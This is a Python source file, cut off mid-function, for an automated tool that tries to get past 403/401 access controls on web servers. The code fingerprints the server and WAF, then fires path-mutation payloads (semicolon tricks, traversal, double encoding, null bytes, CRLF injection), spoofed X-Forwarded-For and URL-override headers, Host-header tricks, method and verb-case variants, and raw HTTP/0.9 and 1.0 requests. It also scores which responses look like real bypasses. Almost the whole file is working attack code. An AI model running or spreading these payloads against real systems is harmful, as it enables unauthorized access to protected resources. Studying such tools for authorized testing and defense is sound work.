#!/usr/bin/env python3
import requests
import sys
import argparse
import random
import string
import json
import hashlib
import time
import re
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, quote
from collections import Counter

# Flush stdout for piped/non-TTY contexts
sys.stdout.reconfigure(line_buffering=True) if hasattr(sys.stdout, 'reconfigure') else None

MAX_RESPONSE_BODY = 102400  # 100KB cap for response body storage

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

# ---------------------------------------------------------------------------
# Thread-safe globals
# ---------------------------------------------------------------------------
_lock = threading.Lock()
BASELINE = {}
RESULTS = []
RATE_LIMIT_STATE = {"consecutive_429": 0, "delay": 0.0, "total_requests": 0, "blocked": False, "max_threads": 15}

def record_result(result_dict):
    with _lock:
        RESULTS.append(result_dict)

def update_baseline(key, value):
    with _lock:
        BASELINE[key] = value

def get_baseline(key):
    with _lock:
        return BASELINE.get(key)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
]

BYPASS_USER_AGENTS = [
    ('Googlebot', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'),
    ('Bingbot', 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'),
    ('curl', 'curl/7.68.0'),
    ('Empty', ''),
]

# Reduced to high-value IP spoofing combinations only
IP_SPOOF_PRIORITY = [
    ('X-Forwarded-For', '127.0.0.1'),
    ('X-Real-IP', '127.0.0.1'),
    ('X-Originating-IP', '127.0.0.1'),
    ('X-Client-IP', '127.0.0.1'),
    ('True-Client-IP', '127.0.0.1'),
    ('CF-Connecting-IP', '127.0.0.1'),
    ('X-Custom-IP-Authorization', '127.0.0.1'),
    ('X-Forwarded-For', '::1'),
    ('X-Real-IP', '::1'),
    ('X-Forwarded-For', '0.0.0.0'),
    ('X-Forwarded-For', '10.0.0.1'),
    ('X-Forwarded-For', '192.168.1.1'),
    ('Forwarded', 'for=127.0.0.1'),
    ('X-Forwarded-For', '127.0.0.1, 127.0.0.2'),
    ('X-Custom-IP-Authorization', '::1'),
]

# ---------------------------------------------------------------------------
# Server Fingerprinting
# ---------------------------------------------------------------------------
class ServerFingerprint:
    def __init__(self):
        self.server = ""
        self.technology = set()
        self.waf = ""
        self.cdn = ""
        self.framework = ""

    def __str__(self):
        parts = []
        if self.server:
            parts.append(f"Server: {self.server}")
        if self.framework:
            parts.append(f"Framework: {self.framework}")
        if self.waf:
            parts.append(f"WAF: {self.waf}")
        if self.cdn:
            parts.append(f"CDN: {self.cdn}")
        if self.technology:
            parts.append(f"Tech: {', '.join(self.technology)}")
        return ' | '.join(parts) if parts else "Unknown"

    @property
    def is_tomcat(self):
        return any(t in self.server.lower() for t in ('tomcat', 'coyote')) or 'java' in str(self.technology).lower()

    @property
    def is_spring(self):
        return 'spring' in str(self.technology).lower() or 'whitelabel' in str(self.technology).lower()

    @property
    def is_nginx(self):
        return 'nginx' in self.server.lower()

    @property
    def is_apache(self):
        return 'apache' in self.server.lower() and not self.is_tomcat

    @property
    def is_iis(self):
        return 'iis' in self.server.lower() or 'microsoft' in self.server.lower()

    @property
    def is_cloudflare(self):
        return self.cdn == 'cloudflare' or self.waf == 'cloudflare'

    @property
    def is_akamai(self):
        return self.cdn == 'akamai' or self.waf == 'akamai'


def fingerprint_server(url, custom_headers=None, verbose=False):
    fp = ServerFingerprint()
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    if custom_headers:
        headers.update(custom_headers)

    try:
        r = requests.get(url, headers=headers, timeout=8, verify=False, allow_redirects=True)
    except requests.exceptions.RequestException:
        return fp

    h = {k.lower(): v for k, v in r.headers.items()}

    # Server header
    fp.server = h.get('server', '')

    # WAF detection
    if 'cf-ray' in h or h.get('server', '').lower() == 'cloudflare':
        fp.waf = 'cloudflare'
        fp.cdn = 'cloudflare'
    elif 'x-sucuri-id' in h:
        fp.waf = 'sucuri'
    elif any(k.startswith('x-akamai') for k in h):
        fp.waf = 'akamai'
        fp.cdn = 'akamai'
    elif 'x-cdn' in h and 'incapsula' in h.get('x-cdn', '').lower():
        fp.waf = 'imperva'
    elif h.get('server', '').lower().startswith('awselb') or 'x-amz' in str(h):
        fp.cdn = 'aws'

    # Technology detection from headers
    powered = h.get('x-powered-by', '').lower()
    if 'php' in powered:
        fp.technology.add('PHP')
    if 'asp.net' in powered:
        fp.technology.add('ASP.NET')
    if 'express' in powered:
        fp.technology.add('Node/Express')
    if 'next.js' in powered:
        fp.technology.add('Next.js')

    # Framework detection from body
    body = r.text[:4096].lower()
    if 'whitelabel error' in body or 'spring' in body:
        fp.framework = 'Spring'
        fp.technology.add('Java')
    if 'x-aspnet-version' in h or 'x-aspnetmvc-version' in h:
        fp.framework = 'ASP.NET'
    if 'laravel' in body or 'laravel_session' in h.get('set-cookie', '').lower():
        fp.framework = 'Laravel'
        fp.technology.add('PHP')
    if 'django' in body:
        fp.framework = 'Django'
        fp.technology.add('Python')
    if 'ruby on rails' in body or 'x-runtime' in h:
        fp.framework = 'Rails'
        fp.technology.add('Ruby')

    # Detect Tomcat from error pages
    try:
        r404 = requests.get(url.rstrip('/') + '/thisshoulddefinitelynotexist' + ''.join(random.choices(string.ascii_lowercase, k=6)),
                           headers=headers, timeout=5, verify=False)
        body404 = r404.text[:2048].lower()
        if 'apache tomcat' in body404 or 'coyote' in body404:
            fp.server = fp.server or 'Apache Tomcat'
            fp.technology.add('Java')
        if 'nginx' in body404 and not fp.server:
            fp.server = 'nginx'
    except Exception:
        pass

    if verbose:
        print(f"{colors.CYAN}[*] Fingerprint: {fp}{colors.END}")

    return fp


def select_phases_for_fingerprint(fp):
    """Return a set of phase names to SKIP based on server fingerprint."""
    skip = set()

    # Only skip semicolons when we're SURE it's nginx/Apache/IIS (not Tomcat/Spring)
    # Unknown servers might still be vulnerable to semicolons
    if (fp.is_nginx or fp.is_apache or fp.is_iis) and not (fp.is_tomcat or fp.is_spring):
        skip.add('_semicolon_paths')

    # Windows-specific paths only when NOT confirmed as IIS
    if (fp.is_nginx or fp.is_apache) and not fp.is_iis:
        skip.add('_windows_paths')

    # If behind Cloudflare/Akamai, IP spoofing is almost certainly useless
    if fp.is_cloudflare or fp.is_akamai:
        skip.add('IP spoofing headers')

    return skip


# ---------------------------------------------------------------------------
# Response Body Analysis
# ---------------------------------------------------------------------------
LOGIN_INDICATORS = [
    'login', 'log in', 'sign in', 'signin', 'sign-in',
    'password', 'username', 'authenticate', 'authorization required',
    'access denied', 'permission denied', 'not authorized',
    'forbidden', '403 forbidden', '401 unauthorized',
]

ERROR_PAGE_INDICATORS = [
    'page not found', 'not found', '404', 'does not exist',
    'error occurred', 'internal server error', '500',
    'bad request', 'bad gateway', 'service unavailable',
]

GENERIC_CONTENT_INDICATORS = [
    'default web site', 'welcome to nginx', 'apache2 default page',
    'it works!', 'test page', 'coming soon', 'under construction',
    'placeholder', 'parked domain',
]


def analyze_response_body(response, path):
    """Analyze response body to determine if it's a real bypass or false positive.
    Returns (is_real, confidence, reason)."""
    if response is None:
        return False, 0, "no response"

    body = response.text[:8192].lower()
    body_len = len(response.content)

    # Empty body with 200 — suspicious
    if body_len < 10:
        return False, 20, "empty body"

    # Check for login/auth pages (403 -> redirect to login is NOT a bypass)
    login_matches = sum(1 for ind in LOGIN_INDICATORS if ind in body)
    if login_matches >= 2:
        return False, 10, "login/auth page"

    # Check for error pages returned as 200
    error_matches = sum(1 for ind in ERROR_PAGE_INDICATORS if ind in body)
    if error_matches >= 2:
        return False, 15, "error page with 200 status"

    # Check for JSON error responses (APIs returning errors as 200)
    if body.lstrip().startswith('{') or body.lstrip().startswith('['):
        if any(w in body for w in ['"error"', '"errors"', '"message":', '"fault"', '"status":4', '"status":5']):
            return False, 15, "JSON error response"

    # Check for generic placeholder pages
    for ind in GENERIC_CONTENT_INDICATORS:
        if ind in body:
            return False, 10, f"generic page: {ind}"

    # Check for <title> containing error/forbidden/denied
    title_match = re.search(r'<title[^>]*>(.*?)</title>', body, re.DOTALL)
    if title_match:
        title = title_match.group(1).strip().lower()
        if any(w in title for w in ['forbidden', 'denied', 'error', 'login', 'sign in', '403', '401', '404']):
            return False, 15, f"title indicates error/auth: {title[:60]}"

    # Path-specific content check — does the response mention the path?
    if path:
        path_parts = path.strip('/').split('/')
        meaningful_parts = [p for p in path_parts if len(p) > 3 and p not in ('api', 'v1', 'v2', 'v3', 'app')]
        content_relevance = sum(1 for p in meaningful_parts if p.lower() in body)
        if content_relevance > 0:
            return True, 90, f"body references target path content"

    # High confidence: response has substantial unique content
    if body_len > 500:
        # Check if it has HTML structure with real content
        has_structure = '<div' in body or '<section' in body or '<main' in body or '{' in body
        if has_structure:
            return True, 75, "substantial structured content"

    # Medium confidence: has some content
    if body_len > 100:
        return True, 60, "has content (needs manual verification)"

    return True, 40, "minimal content (low confidence)"


# ---------------------------------------------------------------------------
# Adaptive Rate Limiting
# ---------------------------------------------------------------------------
def adaptive_delay():
    """Calculate delay based on rate limit state."""
    with _lock:
        state = RATE_LIMIT_STATE
        if state["blocked"]:
            return -1
        return state["delay"]

def effective_threads(requested):
    """Return thread count reduced by rate limiting."""
    with _lock:
        return min(requested, RATE_LIMIT_STATE["max_threads"])


def update_rate_state(response):
    """Update rate limit state based on response."""
    with _lock:
        RATE_LIMIT_STATE["total_requests"] += 1

        if response is None:
            # Connection errors are NOT rate limiting — don't increment
            return

        if response.status_code in (429, 503):
            RATE_LIMIT_STATE["consecutive_429"] += 1
            RATE_LIMIT_STATE["delay"] = min(8.0, 0.5 * (2 ** RATE_LIMIT_STATE["consecutive_429"]))
            # Reduce threads on rate limiting
            RATE_LIMIT_STATE["max_threads"] = max(2, RATE_LIMIT_STATE["max_threads"] // 2)
            if RATE_LIMIT_STATE["consecutive_429"] >= 10:
                RATE_LIMIT_STATE["blocked"] = True
        else:
            if RATE_LIMIT_STATE["consecutive_429"] > 0:
                RATE_LIMIT_STATE["consecutive_429"] = max(0, RATE_LIMIT_STATE["consecutive_429"] - 1)
            RATE_LIMIT_STATE["delay"] = max(0, RATE_LIMIT_STATE["delay"] - 0.1)


# ---------------------------------------------------------------------------
# Core request helpers
# ---------------------------------------------------------------------------
def random_user_agent():
    return random.choice(USER_AGENTS)

def parse_custom_headers(header_list):
    custom_headers = {}
    if not header_list:
        return custom_headers
    for header in header_list:
        if ':' in header:
            key, value = header.split(':', 1)
            custom_headers[key.strip()] = value.strip()
        else:
            print(f"{colors.YELLOW}[!] Invalid header format (ignored): {header}{colors.END}")
    return custom_headers

def format_url(base_url, path):
    base_url = base_url.rstrip('/')
    if not path:
        return base_url
    path = path.lstrip('/')
    return f"{base_url}/{path}"

def get_domain(url):
    return urlparse(url).netloc.split(':')[0]

def body_signature(response):
    body = response.content or b""
    return len(body), hashlib.sha1(body).hexdigest()

def safe_request(method, url, headers=None, timeout=8, max_retries=1, verbose=False,
                 data=None, allow_redirects=True):
    delay = adaptive_delay()
    if delay < 0:
        return None
    if delay > 0:
        time.sleep(delay)

    for attempt in range(max_retries + 1):
        try:
            r = requests.request(
                method.upper() if method.upper() == method else method,
                url,
                headers=headers,
                timeout=timeout,
                allow_redirects=allow_redirects,
                verify=False,
                data=data,
                stream=True,
            )
            # Cap body download to avoid multi-MB responses
            content = b""
            for chunk in r.iter_content(chunk_size=8192):
                content += chunk
                if len(content) >= MAX_RESPONSE_BODY:
                    break
            r._content = content
            r.close()

            update_rate_state(r)
            if r.status_code in (429, 503) and attempt < max_retries:
                wait = min(8, 2 ** (attempt + 1))
                if verbose:
                    print(f"{colors.YELLOW}    Rate limited ({r.status_code}), backing off {wait}s{colors.END}")
                time.sleep(wait)
                continue
            return r
        except requests.exceptions.ConnectionError as e:
            if 'ConnectionRefused' in str(e) or 'Connection refused' in str(e):
                return None
            if verbose:
                print(f"{colors.RED}    Request error: {e}{colors.END}")
            update_rate_state(None)
            if attempt >= max_retries:
                return None
            time.sleep(0.5)
        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"{colors.RED}    Request error: {e}{colors.END}")
            update_rate_state(None)
            if attempt >= max_retries:
                return None
            time.sleep(0.5)
    return None

def build_curl_command(method, url, headers, data=None):
    parts = [f"curl -k -s -o /dev/null -w '%{{http_code}}' -X {method}"]
    if headers:
        for k, v in headers.items():
            if k == 'User-Agent':
                continue
            display_v = v if len(str(v)) < 200 else str(v)[:50] + "...(truncated)"
            parts.append(f"-H '{k}: {display_v}'")
    if data:
        parts.append(f"-d '{data}'")
    parts.append(f"'{url}'")
    return ' '.join(parts)


# ---------------------------------------------------------------------------
# Baseline + bypass detection
# ---------------------------------------------------------------------------
def capture_baseline(url, path, custom_headers, verbose=False):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)

    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    if r is None:
        update_baseline(path or "", None)
        return

    length, h = body_signature(r)
    body_text = r.text[:4096] if r.text else ""
    update_baseline(path or "", {"status": r.status_code, "length": length, "hash": h, "body_sample": body_text})

    if verbose:
        print(f"{colors.BLUE}[*] Baseline {test_url} -> {r.status_code} ({length} bytes){colors.END}")

    # Root baseline — captures GET / twice for comparing root header override results
    # Two requests measure natural variation from dynamic content (CSRF tokens, timestamps)
    root_url = url.rstrip('/') + '/'
    r_root = safe_request("GET", root_url, req_headers, verbose=verbose)
    if r_root:
        root_len, root_h = body_signature(r_root)
        r_root2 = safe_request("GET", root_url, req_headers, verbose=verbose)
        root_variation = 0
        if r_root2:
            root_len2, _ = body_signature(r_root2)
            root_variation = abs(root_len - root_len2)
        update_baseline("__root__", {
            "status": r_root.status_code, "length": root_len, "hash": root_h,
            "variation": root_variation
        })
        if verbose:
            print(f"{colors.BLUE}[*] Root baseline / -> {r_root.status_code} ({root_len} bytes, variation: {root_variation}){colors.END}")

    # 404 baseline
    rand_path = ''.join(random.choices(string.ascii_lowercase, k=12))
    r404 = safe_request("GET", format_url(url, rand_path), req_headers, verbose=verbose)
    if r404:
        length404, h404 = body_signature(r404)
        update_baseline("__404__", {"status": r404.status_code, "length": length404, "hash": h404})
        if verbose:
            print(f"{colors.BLUE}[*] 404 baseline -> {r404.status_code} ({length404} bytes){colors.END}")

    # Capture a second random 404 to detect dynamic content/CSRF tokens
    rand_path2 = ''.join(random.choices(string.ascii_lowercase, k=10))
    r404b = safe_request("GET", format_url(url, rand_path2), req_headers, verbose=verbose)
    if r404b:
        length404b, h404b = body_signature(r404b)
        update_baseline("__404b__", {"status": r404b.status_code, "length": length404b, "hash": h404b})


def is_bypass(path, response):
    if response is None:
        return False, 0, ""
    code = response.status_code
    if code >= 400:
        return False, 0, ""
    if not (200 <= code < 400):
        return False, 0, ""

    # 3xx redirect — only a bypass if it redirects to the target content, not to login
    if 300 <= code < 400:
        location = response.headers.get('Location', '').lower()
        if any(w in location for w in ['login', 'signin', 'auth', 'sso', 'oauth']):
            return False, 0, "redirects to login"
        return False, 0, "redirect (not a direct bypass)"

    base = get_baseline(path or "")
    if base is None:
        is_real, confidence, reason = analyze_response_body(response, path)
        return is_real, confidence, reason

    length, h = body_signature(response)

    # Same content as the baseline = not a bypass
    if h == base["hash"]:
        return False, 0, "same as baseline response"
    # If baseline was NOT 403/401, findings are unreliable — heavily penalize confidence
    baseline_is_forbidden = base["status"] in (401, 403)
    confidence_penalty = 0 if baseline_is_forbidden else 30
    # Wider size tolerance for non-403 baselines (SPAs serve same shell for all paths)
    size_tol = 32 if baseline_is_forbidden else max(128, int(base["length"] * 0.02))
    if code == base["status"] and abs(length - base["length"]) < size_tol:
        return False, 0, "same status + similar length as baseline"

    # Check against 404 baselines
    for key_404 in ("__404__", "__404b__"):
        base404 = get_baseline(key_404)
        if base404:
            if h == base404["hash"]:
                return False, 0, "matches 404 page"
            if code == base404["status"] and abs(length - base404["length"]) < 32:
                return False, 0, "matches 404 page (similar length)"

    # Check against root baseline — if response matches GET /, the bypass header was ignored
    base_root = get_baseline("__root__")
    if base_root:
        if h == base_root["hash"]:
            return False, 0, "same as root page (header ignored)"
        root_len = base_root["length"]
        root_var = base_root.get("variation", 0)
        # Adaptive tolerance: scale floor with root size, not a fixed 256
        min_tol = min(256, max(32, int(root_len * 0.15)))
        tolerance = max(min_tol, int(root_len * 0.05), root_var * 3 + 64)
        if code == base_root["status"] and abs(length - root_len) < tolerance:
            return False, 0, "similar to root page (header likely ignored)"

    # Body analysis for deeper FP detection
    is_real, confidence, reason = analyze_response_body(response, path)
    confidence = max(0, confidence - confidence_penalty)
    if confidence_penalty > 0:
        reason += " (baseline was not 403/401)"
    return is_real, confidence, reason


# ---------------------------------------------------------------------------
# Technique lists (prioritized)
# ---------------------------------------------------------------------------

# HIGH PRIORITY — techniques with proven bounty track records
PATH_MUTATIONS_HIGH = [
    # Semicolons (Tomcat/Spring — €1500 bounty technique)
    "{0}..;/", "{0};/", "{0};", "..;/{0}", "/..;/{0}",
    "{0}/..;/", "/{0};/", "{0};.css", "{0};.js",
    # Dot-segment traversal
    "{0}/../{0}", "%2e/{0}", "{0}/..", "static/../{0}", "assets/../{0}",
    "images/../{0}", "js/../{0}", "css/../{0}", "api/../{0}",
    # Double slash
    "//{0}", "//{0}//", "///{0}",
    # Trailing tricks
    "{0}/", "/{0}/", "{0}/.", "/{0}/./", "./{0}/./",
    # URL encoding of separators
    "%2f{0}", "%2f{0}%2f",
    # Query/fragment tricks
    "{0}?", "{0}??", "{0}#", "{0}?anything=1",
    # Null byte
    "{0}%00", "{0}%00.html", "{0}%00.json",
]

# MEDIUM PRIORITY
PATH_MUTATIONS_MEDIUM = [
    # File extension tricks
    "{0}.html", "{0}.php", "{0}.json", "{0}.xml", "{0}.js",
    "{0}.css", "{0}.txt", "{0}.wsdl",
    # Whitespace
    "{0}%20", "{0}%09", "{0}%0a", "{0}%0d",
    # Double-encoded
    "/%252e/{0}", "/%252e%252e/{0}", "%252f{0}",
    # Junk prefix traversal
    "a/../{0}", "x/../{0}", "anything/../{0}",
    "a/..%5c{0}", "x/..%5c{0}",
    # Dot tricks
    "{0}%2e", "/{0}/%2e/", "%2e%2e/{0}",
    # Mixed
    "{0}/./", "{0}//", "{0}///",
    # Fragment
    "#/../{0}", "%23/../{0}",
]

# LOW PRIORITY
PATH_MUTATIONS_LOW = [
    # Unicode fullwidth
    "{0}%ef%bc%8f", "%ef%bc%8f{0}",
    # Unicode overlong
    "{0}%c0%af", "{0}%e0%80%af",
    # Whitespace variants
    "{0}%a0", "{0}%85", "{0}%c2%a0",
    # Windows-specific
    "{0}::$DATA", "{0}::$INDEX_ALLOCATION",
    # CRLF
    "{0}%0d%0aX-Injected:%20true",
    # Backslash
    "{0}..\\", "{0}..%5c",
    # Random junk
    "{0}/.randomstring",
    "{0}%20assets%20/",
]

BYPASS_HEADERS = [
    # URL/Path override (highest value)
    {"X-Original-URL": "/{path}"},
    {"X-Rewrite-URL": "/{path}"},
    {"X-Override-URL": "/{path}"},
    {"X-Forwarded-Path": "/{path}"},

    # Scheme/Protocol
    {"X-Forwarded-Proto": "https"},
    {"X-Forwarded-Scheme": "https"},
    {"X-Forwarded-Ssl": "on"},

    # Port
    {"X-Forwarded-Port": "80"},
    {"X-Forwarded-Port": "443"},
    {"X-Forwarded-Port": "8080"},

    # Routing
    {"X-Requested-With": "XMLHttpRequest"},
    {"Content-Length": "0"},
    {"Connection": "close, X-Forwarded-For"},

    # Destination
    {"Destination": "/{path}"},

    # URL headers
    {"Http-Url": "/{path}"},
    {"Request-Uri": "/{path}"},
    {"X-Proxy-Url": "/{path}"},
    {"X-Http-Host-Override": "localhost"},

    # Referer/Origin
    {"Referer": "{target}/{path}"},
    {"Origin": "{target}"},
    {"Referer": "http://localhost/{path}"},

    # Content-Type
    {"Content-Type": "application/json"},
    {"Content-Type": "application/xml"},

    # Accept
    {"Accept": "application/json"},

    # Forwarded host
    {"X-Forwarded-Host": "localhost"},
    {"X-Host": "localhost"},

    # Cache bypass
    {"Cache-Control": "no-cache, no-store"},
    {"Pragma": "no-cache"},
]

HTTP_METHODS = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "HEAD", "OPTIONS", "TRACE",
    "PROPFIND", "MKCOL", "MOVE", "COPY",
    "LOCK", "UNLOCK", "SEARCH", "DEBUG", "TRACK",
]

HTTP_METHOD_CASE_VARIANTS = [
    "get", "Get", "gEt",
    "post", "Post",
    "put", "Put",
    "patch", "Patch",
    "delete", "Delete",
    "options", "Options",
]


# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------
def test_fuzzing(url, path=None, method="GET", headers=None, custom_headers=None,
                 verbose=False, data=None, note=None):
    test_url = format_url(url, path) if path else url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    if headers:
        processed = headers.copy()
        for k, v in processed.items():
            if v and isinstance(v, str):
                if "{domain}" in v:
                    processed[k] = v.replace("{domain}", get_domain(url))
                if "{target}" in v:
                    processed[k] = v.replace("{target}", url)
                if "{path}" in v:
                    processed[k] = v.replace("{path}", (path or "").lstrip('/'))
        req_headers.update(processed)

    if any(c.isspace() for c in method):
        return False, 0, None, None, None, None, 0

    r = safe_request(method, test_url, req_headers, verbose=verbose, data=data)
    bypassed, confidence, reason = is_bypass(path, r)
    if bypassed and confidence >= 40:
        return True, r.status_code, method, req_headers, path, note, confidence
    return False, 0, None, None, None, None, 0

def test_protocol_switch(url, path, custom_headers, verbose):
    base_url = url.replace('https://', 'http://') if url.startswith('https://') else url.replace('http://', 'https://')
    test_url = format_url(base_url, path) if path else base_url
    req_headers = {"User-Agent": random_user_agent()}
    if custom_headers:
        req_headers.update(custom_headers)
    r = safe_request("GET", test_url, req_headers, verbose=verbose)
    bypassed, confidence, reason = is_bypass(path, r)
    if bypassed and confidence >= 40:
        return True, r.status_code, "GET", req_headers, path, test_url, confidence
    return False, 0, None, None, None, None, 0

def test_root_header_override(url, path, custom_headers, verbose):
    if not path:
        return []
    eff = path if path.startswith('/') else f"/{path}"
    root_url = url.rstrip('/') + '/'
    results = []
    override_headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL", "X-Forwarded-Path"]
    for header_name in override_headers:
        h = {"User-Agent": random_user_agent(), header_name: eff}
        if custom_headers:
            h.update(custom_headers)
        if verbose:
            print(f"{colors.BLUE}[*] Root override GET / | {header_name}: {eff}{colors.END}")
        r = safe_request("GET", root_url, h, verbose=verbose)
        bypassed, confidence, reason = is_bypass(path, r)
        if bypassed and confidence >= 40:
            results.append((True, r.status_code, "GET", h, eff, root_url, header_name, confidence))
    return results

def test_method_override(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    override_combos = [
        ("X-HTTP-Method-Override", "GET"),
        ("X-HTTP-Method", "GET"),
        ("X-Method-Override", "GET"),
        ("X-HTTP-Method-Override", "POST"),
        ("X-HTTP-Method-Override", "PUT"),
    ]
    results = []
    for oh_name, oh_val in override_combos:
        for verb in ("POST", "PUT", "PATCH"):
            h = {"User-Agent": random_user_agent(), oh_name: oh_val}
            if custom_headers:
                h.update(custom_headers)
            r = safe_request(verb, test_url, h, verbose=verbose)
            bypassed, confidence, reason = is_bypass(path, r)
            if bypassed and confidence >= 40:
                results.append((True, r.status_code, verb, h, path,
                                f"{oh_name}: {oh_val}", confidence))
    return results

def test_http_0_9(url, path, verbose):
    try:
        import socket
        parsed = urlparse(url)
        host = parsed.hostname
        is_https = url.startswith('https://')
        port = parsed.port or (443 if is_https else 80)
        eff = f"/{path.lstrip('/')}" if path else "/"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        if is_https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        s.sendall(f"GET {eff}\r\n".encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 8192:
                    break
        except socket.timeout:
            pass
        s.close()

        if data and not data.startswith(b"HTTP/"):
            # Validate: must have real content, not just a connection close/error
            if len(data) > 50 and b'<' in data:
                # Check it's not just an error page
                data_lower = data[:2048].lower()
                if not any(w in data_lower for w in [b'forbidden', b'denied', b'error', b'not found']):
                    return True, 200, "HTTP/0.9", None, eff, 50
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    HTTP/0.9 error: {e}{colors.END}")
    return False, 0, None, None, None, 0

def test_http_1_0(url, path, custom_headers, verbose):
    try:
        import socket
        parsed = urlparse(url)
        host = parsed.hostname
        is_https = url.startswith('https://')
        port = parsed.port or (443 if is_https else 80)
        eff = f"/{path.lstrip('/')}" if path else "/"

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        if is_https:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        request = f"GET {eff} HTTP/1.0\r\nHost: {host}\r\n"
        if custom_headers:
            for k, v in custom_headers.items():
                request += f"{k}: {v}\r\n"
        request += "\r\n"
        s.sendall(request.encode())
        data = b""
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                data += chunk
                if len(data) > 16384:
                    break
        except socket.timeout:
            pass
        s.close()

        if data and data.startswith(b"HTTP/"):
            status_line = data.split(b"\r\n")[0].decode(errors='replace')
            parts = status_line.split()
            if len(parts) >= 2:
                status_code = int(parts[1])
                if 200 <= status_code < 400:
                    base = get_baseline(path or "")
                    if base and status_code != base["status"]:
                        return True, status_code, "HTTP/1.0", None, eff, 65
    except Exception as e:
        if verbose:
            print(f"{colors.RED}    HTTP/1.0 error: {e}{colors.END}")
    return False, 0, None, None, None, 0

def test_user_agent_bypass(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for ua_name, ua in BYPASS_USER_AGENTS:
        h = {"User-Agent": ua} if ua else {}
        if custom_headers:
            h.update(custom_headers)
        r = safe_request("GET", test_url, h, verbose=verbose)
        bypassed, confidence, reason = is_bypass(path, r)
        if bypassed and confidence >= 40:
            results.append((True, r.status_code, "GET", h, path,
                            f"User-Agent: {ua_name}", confidence))
    return results

def test_ip_spoofing(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for header_name, ip_val in IP_SPOOF_PRIORITY:
        h = {"User-Agent": random_user_agent(), header_name: ip_val}
        if custom_headers:
            h.update(custom_headers)
        r = safe_request("GET", test_url, h, verbose=verbose)
        bypassed, confidence, reason = is_bypass(path, r)
        if bypassed and confidence >= 40:
            results.append((True, r.status_code, "GET", h, path,
                            f"{header_name}: {ip_val}", confidence))
    return results

def test_method_with_body(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    results = []
    bodies = [
        ("application/json", '{}'),
        ("application/x-www-form-urlencoded", 'x=1'),
        ("application/xml", '<root/>'),
    ]
    for content_type, body_data in bodies:
        for method in ("POST", "PUT", "PATCH"):
            h = {"User-Agent": random_user_agent(), "Content-Type": content_type}
            if custom_headers:
                h.update(custom_headers)
            r = safe_request(method, test_url, h, verbose=verbose, data=body_data)
            bypassed, confidence, reason = is_bypass(path, r)
            if bypassed and confidence >= 40:
                results.append((True, r.status_code, method, h, path,
                                f"{method} + {content_type}", confidence))
    return results

def test_host_header_bypass(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    domain = get_domain(url)
    host_values = [
        "localhost", "127.0.0.1", "::1",
        f"{domain}:80", f"{domain}:443", f"{domain}:8080",
        f"{domain}.",  # Trailing dot FQDN
        domain.upper(),
    ]
    for host_val in host_values:
        h = {"User-Agent": random_user_agent(), "Host": host_val}
        if custom_headers:
            for k, v in custom_headers.items():
                if k.lower() != 'host':
                    h[k] = v
        # Don't follow redirects — Host manipulation often triggers redirect loops
        r = safe_request("GET", test_url, h, verbose=verbose, allow_redirects=False)
        if r is None:
            continue
        # A redirect to a different host means the bypass didn't work
        if 300 <= r.status_code < 400:
            continue
        bypassed, confidence, reason = is_bypass(path, r)
        if bypassed and confidence >= 40:
            results.append((True, r.status_code, "GET", h, path,
                            f"Host: {host_val}", confidence))
    return results

def test_verb_case_variants(url, path, custom_headers, verbose):
    test_url = format_url(url, path) if path else url
    results = []
    for method in HTTP_METHOD_CASE_VARIANTS:
        h = {"User-Agent": random_user_agent()}
        if custom_headers:
            h.update(custom_headers)
        try:
            r = safe_request(method, test_url, h, verbose=verbose)
            bypassed, confidence, reason = is_bypass(path, r)
            if bypassed and confidence >= 40:
                results.append((True, r.status_code, method, h, path,
                                f"Verb case: {method}", confidence))
        except Exception:
            pass
    return results

def test_header_combos(url, path, custom_headers, verbose):
    if not path:
        return []
    test_url = format_url(url, path)
    results = []
    combos = [
